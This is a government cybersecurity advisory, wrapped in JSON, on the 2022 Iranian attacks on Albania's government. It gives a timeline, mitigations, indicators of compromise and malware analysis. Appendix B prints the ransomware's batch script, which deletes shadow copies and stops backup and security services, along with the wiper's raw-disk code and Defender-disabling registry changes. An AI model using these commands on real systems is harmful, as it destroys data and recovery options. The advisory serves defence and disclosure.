{
  "markdown": "\n\nSummary\n\nThe Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency (CISA) are releasing this joint Cybersecurity Advisory to provide information on recent cyber operations against the Government of Albania in July and September. This advisory provides a timeline of activity observed, from initial access to execution of encryption and wiper attacks. Additional information concerning files used by the actors during their exploitation of and cyber attack against the victim organization is provided in Appendices A and B.\nIn July 2022, Iranian state cyber actors\u2014identifying as \u201cHomeLand Justice\u201d\u2014launched a destructive cyber attack against the Government of Albania which rendered websites and services unavailable. A FBI investigation indicates Iranian state cyber actors acquired initial access to the victim\u2019s network approximately 14 months before launching the destructive cyber attack, which included a ransomware-style file encryptor and disk wiping malware. The actors maintained continuous network access for approximately a year, periodically accessing and exfiltrating e-mail content.\nBetween May and June 2022, Iranian state cyber actors conducted lateral movements, network reconnaissance, and credential harvesting from Albanian government networks. In July 2022, the actors launched ransomware on the networks, leaving an anti-Mujahideen E-Khalq (MEK) message on desktops. When network defenders identified and began to respond to the ransomware activity, the cyber actors deployed a version of ZeroCleare destructive malware.\nIn June 2022, HomeLand Justice created a website and multiple social media profiles posting anti-MEK messages. On July 18, 2022, HomeLand Justice claimed credit for the cyber attack on Albanian government infrastructure. On July 23, 2022, Homeland Justice posted videos of the cyber attack on their website. From late July to mid-August 2022, social media accounts associated with HomeLand Justice demonstrated a repeated pattern of advertising Albanian Government information for release, posting a poll asking respondents to select the government information to be released by HomeLand Justice, and then releasing that information\u2014either in a .zip file or a video of a screen recording with the documents shown.\nIn September 2022, Iranian cyber actors launched another wave of cyber attacks against the Government of Albania, using similar TTPs and malware as the cyber attacks in July. These were likely done in retaliation for public attribution of the cyber attacks in July and severed diplomatic ties between Albania and Iran.\nDownload the PDF version of this report: pdf, 1221 kb\nDownload the STIX file: pdf, 44 KB\n\nTechnical Details\n\nInitial access\nTimeframe: Approximately 14 months before encryption and wiper attacks.\nDetails: Initial access was obtained via exploitation of an Internet-facing Microsoft SharePoint, exploiting CVE-2019-0604.\nPersistence and Lateral movement\nTimeframe: Approximately several days to two months after initial compromise.\nDetails: After obtaining access to the victim environment, the actors used several .aspx webshells, pickers.aspx, error4.aspx, and ClientBin.aspx, to maintain persistence. During this timeframe, the actors also used RDP (primarily), SMB, and FTP for lateral movement throughout the victim environment.\nExchange Server compromise\nTimeframe: Approximately 1-6 months after initial compromise.\nDetails: The actors used a compromised Microsoft Exchange account to run searches (via CmdLets New-MailboxSearch and Get-Recipient) on various mailboxes, including for administrator accounts. In this timeframe, the actors used the compromised account to create a new Exchange account and add it to the Organization Management role group.\nLikely Email exfiltration\nTimeframe: Approximately 8 months after initial compromise.\nDetails: The actors made thousands of HTTP POST requests to Exchange servers of the victim organization. The FBI observed the client transferring roughly 70-160 MB of data, and the server transferring roughly 3-20 GB of data.\nVPN activity\nTimeframe: Approximately 12-14 months after initial compromise.\nDetails: Approximately twelve months after initial access and two months before launching the destructive cyber attack, the actors made connections to IP addresses belonging to the victim organization\u2019s Virtual Private Network (VPN) appliance. The actors\u2019 activity primarily involved two compromised accounts. The actors executed the \u201cAdvanced Port Scanner\u201d (advanced_port_scanner.exe). The FBI also found evidence of Mimikatz usage and LSASS dumping.\nFile Cryptor (ransomware-style file encryptor)\nTimeframe: Approximately 14 months after initial compromise.\nDetails: For the encryption component of the cyber attack, the actor logged in to a victim organization print server via RDP and kicked off a process (Mellona.exe) which would propagate the GoXml.exe encryptor to a list of internal machines, along with a persistence script called win.bat. As deployed, GoXML.exe encrypted all files (except those having extensions .exe, .dll, .sys, .lnk, or .lck) on the target system, leaving behind a ransom note titled How_To_Unlock_MyFiles.txt in each folder impacted.\nWiper attack\nTimeframe: Approximately 14 months after initial compromise.\nDetails: In the same timeframe as the encryption attack, the actors began actions that resulted in raw disk drives being wiped with the Disk Wiper tool (cl.exe) described in Appendix A. Approximately over the next eight hours, numerous RDP connections were logged from an identified victim server to other hosts on the victim\u2019s network. Command line execution of cl.exe was observed in cached bitmap files from these RDP sessions on the victim server.\n\nMitigations\n\nFBI and CISA recommend organizations apply the following best practices to reduce risk of compromise:\u00a0\n\nEnsure anti-virus and anti-malware software is enabled and signature definitions are updated regularly and in a timely manner. Well-maintained anti-virus software may prevent use of commonly deployed cyber attacker tools that are delivered via spear-phishing.\nAdopt threat reputation services at the network device, operating system, application, and email service levels. Reputation services can be used to detect or prevent low-reputation email addresses, files, URLs, and IP addresses used in spear-phishing attacks.\nIf your organization is employing certain types of software and appliances vulnerable to known Common Vulnerabilities and Exposures (CVEs), ensure those vulnerabilities are patched. Prioritize patching known exploited vulnerabilities.\nMonitor for unusually large amounts of data (i.e. several GB) being transferred from a Microsoft Exchange server.\nCheck the host-based indications, including webshells, for positive hits within your environment.\nMaintain and test an incident response plan.\nEnsure your organization has a vulnerability management program in place and that it prioritizes patch management and vulnerability scanning of known exploited vulnerabilities. Note: CISA\u2019s Cyber Hygiene Services (CyHy) are free to all state, local, tribal, and territorial (SLTT) organizations, as well as public and private sector critical infrastructure organizations.\nProperly configure and secure internet-facing network devices.\n\nDo not expose management interfaces to the internet.\nDisable unused or unnecessary network ports and protocols.\nDisable/remove unused network services and devices.\n\n\nAdopt zero-trust principles and architecture, including:\n\nMicro-segmenting networks and functions to limit or block lateral movements.\nEnforcing phishing-resistant multifactor authentication (MFA) for all users and VPN connections.\nRestricting access to trusted devices and users on the networks.\n\n\n\nFor more information on Iranian government-sponsored malicious cyber activity, see CISA's webpage \u2013 Iran Cyber Threat Overview and Advisories.\nAppendix A\nHost-based IOCs\n\nAdditional details concerning some of these files are provided in Appendix B.\n\n\n\nFile\n\n\nMD5 Hash\n\n\nNotes\n\n\n\n\n\n\nError4.aspx\n\n\n81e123351eb80e605ad73268a5653ff3\n\n\nWebshell\n\n\n\n\ncl.exe\n\n\n7b71764236f244ae971742ee1bc6b098\n\n\nWiper\n\n\n\n\nGoXML.exe\n\n\nbbe983dba3bf319621b447618548b740\n\n\nEncryptor\n\n\n\n\nGoxml.jpg\n\n\n0738242a521bdfe1f3ecc173f1726aa1\n\n\n\u00a0\n\n\n\n\nClientBin.aspx\n\n\na9fa6cfdba41c57d8094545e9b56db36\n\n\nWebshell (reverse-proxy connections)\n\n\n\n\nPickers.aspx\n\n\n8f766dea3afd410ebcd5df5994a3c571\n\n\nWebshell\n\n\n\n\nevaluatesiteupgrade.cs.aspx\n\n\nUnknown\n\n\nWebshell\n\n\n\n\nmellona.exe\n\n\n78562ba0069d4235f28efd01e3f32a82\n\n\nPropagation for Encryptor\n\n\n\n\nwin.bat\n\n\n1635e1acd72809479e21b0ac5497a79b\n\n\nLaunches GoXml.exe on startup\n\n\n\n\nwin.bat\n\n\n18e01dee14167c1cf8a58b6a648ee049\n\n\nChanges desktop background to encryption image\n\n\n\n\nbb.bat\n\n\n59a85e8ec23ef5b5c215cd5c8e5bc2ab\n\n\nSaves SAM and SYSTEM hives to C:\\Temp, makes cab archive\n\n\n\n\ndisable_defender.exe\n\n\n60afb1e62ac61424a542b8c7b4d2cf01\n\n\nDisables Windows Defender\n\n\n\n\nrwdsk.sys\n\n\n8f6e7653807ebb57ecc549cef991d505\n\n\nRaw disk driver utilized by wiper malware\n\n\n\n\nApp_Web_bckwssht.dll\n\n\ne9b6ecbf0783fa9d6981bba76d949c94\n\n\n\u00a0\n\n\n\n\n\u00a0\nNetwork-based IOCs\nFBI review of Commercial VPN service IP addresses revealed the following resolutions (per Akamai data):\n\n\n\n\nCountry\n\n\nCompany\n\n\n\n\nAL\n\n\nKEMINET LTD.\n\n\n\n\nDE\n\n\nNOOP-84-247-59-0-25\n\n\n\n\nDE\n\n\nGSL NETWORKS\n\n\n\n\nGB\n\n\nLON-CLIENTS\n\n\n\n\nGB\n\n\nGB-DATACENTER\n\n\n\n\nNL\n\n\nNL-LAYERSWITCH-20190220\n\n\n\n\nNL\n\n\nPANQ-45-86-200-0\n\n\n\n\nUS\n\n\nPRIVATE CUSTOMER\n\n\n\n\nUS\n\n\nBANDITO NETWORKS\n\n\n\n\nUS\n\n\nEXTERNAL\n\n\n\n\nUS\n\n\nRU-SELENA-20080725\n\n\n\n\nUS\n\n\nTRANS OCEAN NETWORK\n\n\n\n\nAppendix B\nRansomware Cryptor\nGoXML.exe is a ransomware style file encryptor. It is a Windows executable, digitally signed with a certificate issued to the Kuwait Telecommunications Company KSC, a subsidiary of Saudi Telecommunications Company (STC).\nIf executed with five or more arguments (the arguments can be anything, as long as there are five or more), the program silently engages its file encryption functionality. Otherwise, a file-open dialog Window is presented, and any opened documents receive an error prompt labeled, Xml Form Builder.\nAll internal strings are encrypted with a hard coded RC4 key. Before internal data is decrypted, the string decryption routine has a built-in self-test that decrypts a DWORD value and tests to see if the plaintext is the string yes. If so, it will continue to decode its internal strings.\nThe ransomware will attempt to launch the following batch script; however, this will fail due to a syntax error.\n\n\n\n\n@for /F \"skip=1\" %C in ('wmic LogicalDisk get DeviceID') do (@wmic /namespace:\\\\root\\default Path SystemRestore Call disable \"%C\\\" & @rd /s /q %C\\$Recycle.bin)\n@vssadmin.exe delete shadows /all /quiet\n@set SrvLst=vss sql svc$ memtas mepos sophos veeam backup GxVss GxBlr GxFWD GxCVD GxCIMgr DefWatch ccEvtMgr ccSetMgr SavRoam RTVscan QBFCService QBIDPService ntuit.QuickBooks.FCS QBCFMonitorService YooBackup YooIT zhudongfangyu sophos stc_raw_agent VSNAPVSS VeeamTransportSvc VeeamDeploymentService VeeamNFSSvc veeam PDVFSService BackupExecVSSProvider BackupExecAgentAccelerator BackupExecAgentBrowser BackupExecDiveciMediaService BackupExecJobEngine BackupExecManagementService BackupExecRPCService AcrSch2Svc AcronisAgent CASAD2DWebSvc CAARCUpdateSvc\n@for %C in (%SrvLst%) do @net stop %C\n@set SrvLst=\n@set PrcLst=mysql sql oracle ocssd dbsnmp synctime agntsvc isqlplussvc xfssvccon mydesktopservice ocautoupds encsvc tbirdconfig mydesktopqos ocomm dbeng50 sqbcoreservice excel infopath msaccess mspub onenote outlook powerpnt steam thebat thunderbird visio winword wordpad notepad\n@for %C in (%PrcLst%) do @taskkill /f /im \"%C.exe\"\n@set PrcLst=\n@exit\n\n\n\n\n\u00a0\nThe syntax error consists of a missing backslash that separates system32 and cmd.exe, so the process is launched as system32cmd.exe which is an invalid command.\n\n\n\nScript Launch Bug\n\n\u00a0\nThe ransomware\u2019s file encryption routine will generate a random string, take the MD5 hash and use that to generate an RC4 128 key which is used to encrypt files. This key is encrypted with a hard coded Public RSA key and converted to Base64 utilizing a custom alphabet. This is appended to the end of the ransom note.\nThe cryptor places a file called How_To_Unlock_MyFiles.txt in directories with encrypted files.\nEach encrypted file is given the .lck extension and the contents of each file are only encrypted up to 0x100000 or 1,048,576 bytes which is a hard coded limit.\nSeparately, the actor ran a batch script (win.bat below) to set a specific desktop background.\nFile Details\n\n\n\n\nGoXml.exe\n\n\n\n\nFile Size:\n\n\n43.48 KB (44520 bytes)\n\n\n\n\nSHA256:\n\n\nf116acc6508843f59e59fb5a8d643370dce82f492a217764521f46a856cc4cb5\n\n\n\n\nSHA1:\n\n\n5d117d8ef075f3f8ed1d4edcc0771a2a0886a376\n\n\n\n\nMD5:\n\n\nbbe983dba3bf319621b447618548b740\n\n\n\n\nSSDeep:\n\n\n768:+OFu8Q3w6QzfR5Jni6SQD7qSFDs6P93/q0XIc/UB5EPABWX\n:RFu8QAFzffJui79f13/AnB5EPAkX (Ver 1.1)\n\n\n\n\nFile Type:\n\n\nPE32 executable (GUI) Intel 80386 (stripped to external PDB), for MS Windows\n\n\n\n\nPE Header Timestamp:\n\n\n2016-04-30 17:08:19\n\n\n\n\nImpHash:\n\n\n5b2ce9270beea5915ec9adbcd0dbb070\n\n\n\n\nCert #0 Subject C=KW, L=Salmiya, O=Kuwait Telecommunications Company KSC, OU=Kuwait Telecommunications Company, CN=Kuwait Telecommunications Company KSC\nCert #0 Issuer\u00a0 C=US, O=DigiCert Inc, OU=www.digicert.com, CN=DigiCert SHA2 Assured ID Code Signing CA\nCert #0 SHA1\u00a0\u00a0\u00a0 55d90ec44b97b64b6dd4e3aee4d1585d6b14b26f\n\n\n\n\n\u00a0\n\n\n\n\nwin.bat (#1, run malware)\n\n\n\n\nFile Size:\n\n\n67 bytes\n\n\n\n\nSHA256:\n\n\nbad65769c0b416bb16a82b5be11f1d4788239f8b2ba77ae57948b53a69e230a6\n\n\n\n\nSHA1:\n\n\n14b8c155e01f25e749a9726958606b242c8624b9\n\n\n\n\nMD5:\n\n\n1635e1acd72809479e21b0ac5497a79b\n\n\n\n\nSSDeep:\n\n\n3:LjTFKCkRErG+fyM1KDCFUF82G:r0aH1+DF82G (Ver 1.1)\n\n\n\n\nFile Type:\n\n\nASCII text, with no line terminators\n\n\n\n\nContents: \n\n\nstart /min C:\\ProgramData\\Microsoft\\Windows\\GoXml.exe 1 2 3 4 5 6 7\n\n\n\n\n\u00a0\n\n\n\n\nwin.bat (#2, install desktop image)\n\n\n\n\nFilename:\n\n\nec4cd040fd14bff86f6f6e7ba357e5bcf150c455532800edf97782836e97f6d2\n\n\n\n\nFile Size:\n\n\n765 bytes\n\n\n\n\nSHA256:\n\n\nec4cd040fd14bff86f6f6e7ba357e5bcf150c455532800edf97782836e97f6d2\n\n\n\n\nSHA1:\n\n\nfce0db6e66d227d3b82d4564446ede0c0fd7598c\n\n\n\n\nMD5:\n\n\n18e01dee14167c1cf8a58b6a648ee049\n\n\n\n\nSSDeep:\n\n\n12:wbYVJ69/TsdLd6sdLd3mTDwfV+EVTCuwfV+EVTCuwfV+EVTCuwfV+EVTCuwfV\n+Et:wq69/kZxZ3mTDY9HY9HY9HY9HY9j (Ver 1.1)\n\n\n\n\nFile Type:\n\n\nDOS batch file text, ASCII text, with CRLF line terminators\n\n\n\n\nContents:\n@echo off\nsetlocal enabledelayedexpansion\nset \"Wtime=!time:~0,2!\"\nif \"!Wtime!\" leq \"20\" reg add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v Wallpaper /t REG_SZ /d \"c:\\programdata\\GoXml.jpg\" /f & goto done\nif \"!Wtime!\" geq \"20\" reg add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v Wallpaper /t REG_SZ /d \"c:\\programdata\\GoXml.jpg\" /f & goto done\n:done\ntimeout /t 5 >nul\nstart \"\" /b RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters ,1 ,True\nstart \"\" /b RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters ,1 ,True\nstart \"\" /b RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters ,1 ,True\nstart \"\" /b RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters ,1 ,True\nstart \"\" /b RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters ,1 ,True\nendlocal\n\n\n\n\n\u00a0\n\n\n\n\ngoxml.jpg\n\n\n\n\nFile Size:\n\n\n1.2 MB (1259040 bytes)\n\n\n\n\nSHA256:\n\n\n63dd02c371e84323c4fd9a161a75e0f525423219e8a6ec1b95dd9eda182af2c9\n\n\n\n\nSHA1:\n\n\n683eaec2b3bb5436f00b2172e287dc95e2ff2266\n\n\n\n\nMD5:\n\n\n0738242a521bdfe1f3ecc173f1726aa1\n\n\n\n\nSSDeep:\n\n\n12288:ME0p1RE70zxntT/ylTyaaSMn2fS+0M6puxKfJbDKrCxMe5fPSC2tmx\nVjpJT/n37p:MHyUt7yQaaPXS6pjar+MwrjpJ7VIbZg (Ver 1.1)\n\n\n\n\nFile Type:\n\n\nJPEG image data, Exif standard: [TIFF image data, big-endian, direntries=13, height=1752, bps=0, PhotometricIntepretation=CMYK, orientation=upper-left, width=2484TIFF image data, big-endian, direntries=13, height=1752, bps=0, PhotometricIntepretation=CMYK, orientation=upper-left, width=2484], progressive, precision 8, 2484x1752, components 4\n\n\n\n\nSoftware:\n\n\nAdobe Photoshop 22.4 (Windows)\n\n\n\n\nModify Date:\n\n\n2022-07-13 20:45:20\n\n\n\n\nCreate Date:\n\n\n2020-06-11 02:13:33\n\n\n\n\nMetadata Date:\n\n\n2022-07-13 20:45:20\n\n\n\n\nProfile Date Time:\n\n\n2000-07-26 05:41:53\n\n\n\n\nImage Size:\n\n\n2484x1752\n\n\n\n\nFile Size:\n\n\n1.2 MB (1259040 bytes)\n\n\n\n\nSHA256:\n\n\n63dd02c371e84323c4fd9a161a75e0f525423219e8a6ec1b95dd9eda182af2c9\n\n\n\n\nDisk Wiper\nThe files cl.exe and rwdsk.sys are part of a disk wiper utility that provides raw access to the hard drive for the purposes of wiping data. From the command line the cl.exe file accepts the arguments:\n\nin\nun\nwp <optional argument>\n\nIf executed with the in command, the utility will output in start! and installs a hard coded file named rwdsk.sys as a service named RawDisk3. The .SYS file is not extracted from the installer however, but rather the installer looks for the file in the same directory that the cl.exe is executed in.\u00a0\n\n\nIt will also load the driver after installation.\n\nThe un command uninstalls the service, outputting the message \u201cun start!\u201d to the terminal.\nThe wp command will access the loaded driver for raw disk access.\n\n\n\nRaw Disk Access\n\nThe long hexadecimal string is hard coded in the cl.exe binary.\n\n\n\n\n\u00a0\u00a0\u00a0\u00a0\u00a0 RawDisk3File = (void *)toOpenRawDisk3File(\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 arg2_WideCharStr,\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 0xC0000000,\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 L\"B4B615C28CCD059CF8ED1ABF1C71FE03C0354522990AF63ADF3C911E2287A4B906D47D\");\n\u00a0\u00a0\u00a0\u00a0\u00a0 ptrRawDiskFile = RawDisk3File;\n\u00a0\u00a0\u00a0\u00a0\u00a0 if ( RawDisk3File )\n\u00a0\u00a0\u00a0\u00a0\u00a0 {\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 sizeDisk = toGetDiskSize(RawDisk3File);\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 terminal_out(\"Total Bytez : %lld\\n\", sizeDisk << 9);\n\n\n\n\nThe wp command also takes an additional argument as a device path to place after \\RawDisk3\\ in the output string. It is uncertain what creates this path to a device as the driver tested did not.\nThe output is \u201cwp starts!\u201d followed by the total bytes of the drive and the time the wipe operation takes.\nIf the registry key value HKLM\\SOFTWARE\\EldoS\\EventLog is set to \u201cEnabled\u201d, the install will generate an event log if at any time the install produces an error. This log contains an error code DWORD followed by the string ..\\..\\DriverLibraries\\DrvSupLib\\install.c. If the system does not have the SOFTWARE\\EldoS key, no event logs would be produced. This feature must be a related to the legitimate EldoS utility.\u00a0\n\nrwdsk.sys is a \u201clegitimate commercial driver from the EldoS Corporation that is used for interacting with files, disks, and partitions. The driver allows for direct modification of data on a local computer\u2019s hard drive. In some cases, the tool can enact these raw disk modifications from user-mode processes, circumventing Windows operating system security features.\"https://attack.mitre.org/software/S0364/\nFile Details\n\n\n\n\ncl.exe\n\n\n\u00a0\n\n\n\n\nFile Size\n\n\n142.5 KB (145920 bytes)\n\n\n\n\nSHA256\n\n\ne1204ebbd8f15dbf5f2e41dddc5337e3182fc4daf75b05acc948b8b965480ca0\n\n\n\n\nSHA1\n\n\nf22a7ec80fbfdc4d8ed796119c76bfac01e0a908\n\n\n\n\nMD5\n\n\n7b71764236f244ae971742ee1bc6b098\n\n\n\n\nSSDeep\n\n\n3072:vv2ADi7yOcE/YMBSZ0fZX4kpK1OhJrDwM:vv2jeQ/flfZbKM (Ver 1.1)\n\n\n\n\nFiletype\n\n\nPE32+ executable (console) x86-64, for MS Windows\n\n\n\n\nPE Header Timestamp\n\n\n2022-07-15 13:26:28\n\n\n\n\nImpHash\n\n\n58d51c1152817ca3dec77f2eee52cbef\n\n\n\n\n\u00a0\n\n\n\n\nrwdsk.sys\n\n\u00a0\n\n\n\nFile Size\n\n\n38.84 KB (39776 bytes)\n\n\n\n\nSHA256\n\n\n3c9dc8ada56adf9cebfc501a2d3946680dcb0534a137e2e27a7fcb5994cd9de6\n\n\n\n\nSHA1\n\n\n5e061701b14faf9adec9dd0b2423ff3cfc18764b\n\n\n\n\nMD5\n\n\n8f6e7653807ebb57ecc549cef991d505\n\n\n\n\nSSDeep\n\n\n768:E31ySCpoCbXnfDbEaJSooKIDyE9aBazWlEAusxsia:0gyCb3MFKIHO4Ausxta (Ver 1.1)\n\n\n\n\nFiletype\n\n\nPE32+ executable (native) x86-64, for MS Windows\n\n\n\n\nPEtype\n\n\nDriver\n\n\n\n\nPE Header Timestamp\n\n\n2016-03-18 14:44:54\n\n\n\n\nImpHash\n\n\ne233f2cdc91faafe1467d9e52f166213\n\n\n\n\nCert #0 Subject\n\n\nCN=VeriSign Time Stamping Services CA, O=VeriSign, Inc., C=US\n\n\n\n\nCert #0 Issuer\n\n\nCN=VeriSign Time Stamping Services CA, O=VeriSign, Inc., C=US\n\n\n\n\nCert #0 SHA1\n\n\n382c18388fb326221dfd7a77ee874f9ba60e04bf\n\n\n\n\nCert #1 Subject\n\n\nC=US, ST=California, L=SANTA CLARA, O=NVIDIA Corporation, CN=NVIDIA Corporation\n\n\n\n\nCert #1 Issuer\n\n\nC=US, O=VeriSign, Inc., OU=VeriSign Trust Network, OU=Terms of use at https://www.verisign.com/rpa (c)10, CN=VeriSign Class 3 Code Signing 2010 CA\n\n\n\n\nCert #1 SHA1\n\n\n30632ea310114105969d0bda28fdce267104754f\n\n\n\n\nCert #2 Subject\n\n\nC=US, O=VeriSign, Inc., OU=VeriSign Trust Network, OU=(c) 2006 VeriSign, Inc.\u00a0- For authorized use only, CN=VeriSign Class 3 Public Primary Certification Authority - G5\n\n\n\n\nCert #2 Issuer\n\n\nC=US, ST=Washington, L=Redmond, O=Microsoft Corporation, CN=Microsoft Code Verification Root\n\n\n\n\nCert #2 SHA1\n\n\n57534ccc33914c41f70e2cbb2103a1db18817d8b\n\n\n\n\nCert #3 Subject\n\n\nC=US, O=VeriSign, Inc., OU=VeriSign Trust Network, OU=Terms of use at https://www.verisign.com/rpa (c)10, CN=VeriSign Class 3 Code Signing 2010 CA\n\n\n\n\nCert #3 Issuer\n\n\nC=US, O=VeriSign, Inc., OU=VeriSign Trust Network, OU=(c) 2006 VeriSign, Inc.\u00a0- For authorized use only, CN=VeriSign Class 3 Public Primary Certification Authority - G5\n\n\n\n\nCert #3 SHA1\n\n\n495847a93187cfb8c71f840cb7b41497ad95c64f\n\n\n\n\n\u00a0\nAdditional Files\nWeb Deployed Reverse Proxy\nDescription\nClientBin.aspx is an ASP file that contains a Base64 encoded .Net executable (App_Web_bckwssht.dll) that it decodes and loads via Reflection. The .Net executable contains Class and Method obfuscation and internal strings are encoded with a single byte XOR obfuscation.\n\npublic static string hair_school_bracket()\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 {\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u00a0return Umbrella_admit_arctic.rebel_sadreporthospital(\"460F2830272A2F2266052928202F21661627252D27212368\");\u00a0 //Invalid Config Package.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 }\n\npublic static string Visual_math_already()\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 {\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 return Umbrella_admit_arctic.rebel_sadreporthospital(\"5304057E0116001607\");\u00a0\u00a0 //WV-RESET\n\nThe method rebel_sadreporthospital takes the first byte of the encoded string and XOR\u2019s each subsequent byte to produce the de-obfuscated string.\nWhen run in context of an IIS web server connecting to the ASPX file will generate a 200 <Encryption DLL Info> 1.5 output.\n\u00a0\n\n\n\nInitial connection\n\nThe hex string represents the following ASCII text:\n\nBase64, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null\n\nSending a POST request with a Base64 encoded IP and port will open a second socket to the supplied IP and port making this a Web proxy.\u00a0\n\n\n\nSecond Socket Opened from POST Request\n\nSending a request to WV-RESET with a value will produce an OK response and call a function to shut down the proxy socket.\n\n\n\nTerminate socket\n\nThe DLL extracts a secondary \u201cEncryptionDLL\u201d named Base64.dll which is loaded via Assembly.Load. This exposes two functions, encrypt and decrypt. This DLL is used to decrypt the Proxy IP and port along with data. In this instance the class name is misspelled Bsae64, which is also reflected in the calling DLLs decoded strings. It is uncertain as to why an additional Base64.dll binary is extracted when the same encoding could be hard coded in the original DLL. It is possible other versions of this tool utilize differing \u201cEncryptionDLL\u201d binaries.\n\u00a0\n\n\n\nMisspelled Class Name\n\n\n\nCalled Misspelled Name\n\nFile Details\n\n\n\n\nClientBin.aspx\n\n\u00a0\n\n\n\nFile Size\n\n\n55.24 KB (56561 bytes)\n\n\n\n\nSHA256\n\n\n7ad64b64e0a4e510be42ba631868bbda8779139dc0daad9395ab048306cc83c5\n\n\n\n\nSHA1\n\n\ne03edd9114e7a0138d1309034cad6b461ab0035b\n\n\n\n\nMD5\n\n\na9fa6cfdba41c57d8094545e9b56db36\n\n\n\n\nSSDeep\n\n\n768:x9TfK6nOgo5zE/cezUijAwZIFxK1mGjncrF8EAZ0iBDZBZdywb0DwHN4N4wjMxr8:x9TfdOgAi2 (Ver 1.1)\n\n\n\n\nFiletype\n\n\nHTML document text, ASCII text, with very long lines (56458)\n\n\n\n\n\u00a0\n\n\n\n\nApp_Web_bckwssht.dll\n\n\u00a0\n\n\n\nFile Size\n\n\n41.0 KB (41984 bytes)\n\n\n\n\nSHA256\n\n\ncad2bc224108142b5aa19d787c19df236b0d12c779273d05f9b0298a63dc1fe5\n\n\n\n\nSHA1\n\n\n49fd8de33aa0ea0c7432d62f1ddca832fab25325\n\n\n\n\nMD5\n\n\ne9b6ecbf0783fa9d6981bba76d949c94\n\n\n\n\nSSDeep\n\n\n384:coY4jnD7l9VAk1dtrGBlLGYEX1tah8dgNyamGOvMTfdYN5qZAsP:hlXAkHRGBlUUh8cFmpv6feYLP (Ver 1.1)\n\n\n\n\nFiletype\n\n\nPE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows\n\n\n\n\nPEtype\n\n\nDLL\n\n\n\n\nPE Header Timestamp\n\n\n2021-06-07 10:37:55\n\n\n\n\nImpHash\n\n\ndae02f32a21e03ce65412f6e56942daa\n\n\n\n\nDisable Defender\nDescription\ndisable_defender.exe is a Microsoft Windows PE file that attempts to disable Windows Defender. The application will elevate privileges to that of SYSTEM and then attempt to disable Defender\u2019s core functions. A command prompt with status and error messages is displayed as the application executes. No network activity was detected during the evaluation.\nUpon execution, a command prompt is launched and a message is displayed if the process is not running as SYSTEM. The process is then restarted with the required permissions.\n\n\n\nTest validate permissions\n\nThe application will attempt to terminate the Windows Defender process by calling TerminateProcess for smartscreen.exe:\n\n\n\nAttempt to kill Windows Defender\n\nThe following Registry Keys were modified to disable Windows Defender:\n\n\n\n\nSet Registry Values (observed Win10 1709)\n\n\n\u00a0\n\n\n\n\nHKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\\TamperProtection\u00a0\n\n\n0\u00a0\n\n\n\n\n\u00a0\n\n\n\u00a0\n\n\n\n\nHKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware\u00a0\n\n\n1\u00a0\n\n\n\n\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\\n\t\t\tStartupApproved\\Run\\SecurityHealth\u00a0\n\n\n03 00 00 00 5D 02 00 00 41 3B 47 9D\u00a0\n\n\n\n\nHKLM\\SOFTWARE\\Microsoft\\Windows Defender\\DisableAntiSpyware\u00a0\n\n\n1\u00a0\n\n\n\n\nHKLM\\System\\CurrentControlSet\\Services\\WinDefend\\Start\u00a0\n\n\n3\u00a0\n\n\n\n\nHKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection\\\n\t\t\tDisableRealtimeMonitoring\u00a0\n\n\n1\u00a0\n\n\n\n\nUpon completion and if successful the application will display the following messages and wait for user input.\n\n\n\nUser Input\n\n\n\n\n\ndisable-defender.exe\n\n\u00a0\n\n\n\nFile Size\n\n\n292.0 KB (299008 bytes)\n\n\n\n\nSHA256\n\n\n45bf0057b3121c6e444b316afafdd802d16083282d1cbfde3cdbf2a9d0915ace\n\n\n\n\nSHA1\n\n\ne866cc6b1507f21f688ecc2ef15a64e413743da7\n\n\n\n\nMD5\n\n\n60afb1e62ac61424a542b8c7b4d2cf01\n\n\n\n\nSSDeep\n\n\n6144:t2WhikbJZc+Wrbe/t1zT/p03BuGJ1oh7ISCLun:t2WpZnW+/tVoJ1ouQ (Ver 1.1)\n\n\n\n\nFiletype\n\n\nPE32+ executable (console) x86-64, for MS Windows\n\n\n\n\nPEtype\n\n\nEXE\n\n\n\n\nPE Header Timestamp\n\n\n2021-10-24 15:07:32\n\n\n\n\nImpHash\n\n\n74a6ef9e7b49c71341e439022f643c8e\n\n\n\n\n\nRevisions\n\nSeptember 21, 2022: Initial Version|September 22, 2022: Reordered items in the Mitigation Section|September 23, 2022: Add the STIX file\n",
  "cves": [
    "CVE-2019-0604"
  ],
  "techniques": [],
